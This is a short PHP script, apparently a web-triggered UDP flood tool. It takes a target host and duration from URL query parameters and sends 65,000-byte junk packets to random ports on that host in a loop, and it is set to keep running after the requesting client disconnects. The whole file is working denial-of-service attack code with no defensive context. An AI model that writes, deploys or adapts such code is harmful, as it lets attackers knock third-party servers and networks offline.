<?php

// Modded by Matto.
// Pretty much revamped.
$cmd = $_GET['cmd'];

class main {

	public static function udp($ip, $port, $time)
	{
		$host = gethostbyname($ip);
		$packets = 0;
		ignore_user_abort(TRUE);
		set_time_limit(300);
		$exec_time = $time;
		$time = time();
		$max_time = $time+$exec_time;
	
		for($i=0;$i<65000;$i++)
		{
			$out .= 'X';
		}
		while(1)
		{
			$packets++;
			if(time() > $max_time)
			{
				break;
			}
			$rand = rand(21, 122);
			$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
			if($fp)
			{
					fwrite($fp, $out);
					fclose($fp);
			}
		}
	}
}

if (isset($cmd))
{
	switch($cmd)
	{
		case "udp":
			main::udp($_GET['host'], $_GET['port'], $_GET['time']);
			break;
	}
}

?>